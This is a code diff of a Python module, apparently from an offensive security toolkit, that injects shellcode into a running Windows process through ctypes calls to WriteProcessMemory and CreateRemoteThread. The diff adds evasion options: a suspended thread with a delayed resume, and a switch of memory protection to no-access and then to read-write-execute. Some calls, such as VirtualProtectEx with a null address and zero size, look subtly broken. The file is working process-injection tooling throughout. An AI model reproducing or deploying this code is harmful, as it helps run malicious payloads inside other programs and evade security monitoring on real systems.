@@ -1,8 +1,16 @@
-import utils.arg
 import os
 import ctypes
 
 from utils.helper import nstate as nstate
+
+CATEGORY = 'core'
+
+def register_arguments(parser):
+            parser.add_argument('-i', '--input', help='Input file for process injection')
+            parser.add_argument('-p', '--process', help='Processname to inject the shellcode')
+            parser.add_argument('-r', '--resume-thread', action='store_true', help='Start thread suspended and resume after speciefied time')
+            parser.add_argument('-s', '--start', action='store_true', help='If not active, start the process before injection')
+            parser.add_argument('-v', '--virtual-protect', action='store_true', help='Deny access on memory for a specified time')
 
 class inject:
     from ctypes import windll
@@ -12,27 +20,18 @@ class inject:
     import wmi
     import threading
 
-    Author = 'cpu0x00'
+    Author = 'cpu0x00, psycore8'
     Description = 'Inject shellcode to process'
-    Version = '1.1.0'
-    # Target_Process = ''
-    # Shellcode = ''
-    # StartProcess = False
+    Version = '2.0.0'
+    delay = 5
 
-    def __init__(self, input_file, process_start, target_process, shellcode):
+    def __init__(self, input_file, process_start, target_process, shellcode, resume_thread=None, virtual_protect=None):
         self.input_file = input_file
         self.process_start = process_start
         self.target_process = target_process
         self.shellcode = shellcode
-
-    def init():
-        spName = 'inject'
-        spArgList = [
-            ['-i', '--input', '', '', 'Input file for process injection'],
-            ['-p', '--process', '', '', 'Processname to inject the shellcode'],
-            ['-s', '--start', '', 'store_true', 'If not active, start the process before injection']
-            ]
-        utils.arg.CreateSubParser(spName, inject.Description, spArgList)
+        self.resume_thread = resume_thread
+        self.virtual_protect = virtual_protect
 
     def Start_Process(self):
         tp = self.target_process
@@ -46,12 +45,6 @@ class inject:
         print(f"{nstate.OKGREEN} {self.target_process} process id: {pid}")
         
         return int(pid)
-    
-    # response = request.urlopen(args.server)
-    # shellcode = response.read()
-
-    # if shellcode:
-    #   print(f'[*] retrieved the shellcode from {args.server}')
 
     def start_injection(self):
         if self.Start_Process:
@@ -82,6 +75,16 @@ class inject:
         CreateRemoteThread.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.LPVOID, self.wintypes.LPVOID, self.wintypes.DWORD, self.wintypes.LPDWORD]
         CreateRemoteThread.restype = self.wintypes.HANDLE
 
+        if self.virtual_protect:
+            VirtualProtectEx = kernel32.VirtualProtectEx
+            VirtualProtectEx.argtypes = [self.wintypes.HANDLE, self.wintypes.LPVOID, ctypes.c_size_t, self.wintypes.DWORD, self.wintypes.PWORD]
+            VirtualProtectEx.restype = self.wintypes.BOOL
+
+        if self.resume_thread or self.virtual_protect:
+            ResumeThread = kernel32.ResumeThread
+            ResumeThread.argtypes = [self.wintypes.HANDLE]
+            ResumeThread.restype = self.wintypes.DWORD
+
         CloseHandle = kernel32.CloseHandle
         CloseHandle.argtypes = [self.wintypes.HANDLE]
         CloseHandle.restype = self.wintypes.BOOL
@@ -99,11 +102,31 @@ class inject:
         writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), ctypes.byref(c_null))
         if writing:
             print(f'{nstate.OKGREEN} Wrote The shellcode to memory')
+        if self.virtual_protect:
+            print(f"{nstate.OKBLUE} VirtualProtectEx: PAGE_NO_ACCESS")
+            VirtualProtectEx(phandle, None, 0, 0x01, None)
 
-        Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)
+        if self.resume_thread or self.virtual_protect:
+            print(f"{nstate.OKBLUE} CreateRemoteThread: START_SUSPENDED")
+            Injection = CreateRemoteThread(phandle, None, 0, memory, None, 0x00000004, None)
+        else:
+            Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)
 
         if Injection:
             print(f'{nstate.OKGREEN} Injected the shellcode into the process')
+
+        if self.virtual_protect:
+            print(f"{nstate.OKBLUE} VirtualProtectEx: PAGE_READWRITE_EXECUTE")
+            #self.sleep(self.delay)
+            VirtualProtectEx(phandle, None, 0, 0x40, None)
+
+        if self.resume_thread or self.virtual_protect:
+            self.sleep(self.delay)
+            print(f"{nstate.OKBLUE} ResumeThread")
+            resume = ResumeThread(Injection)
+            if resume:
+                print(f'{nstate.OKGREEN} Process resumed')
+
         CloseHandle(phandle)
 
     def proc_inject():
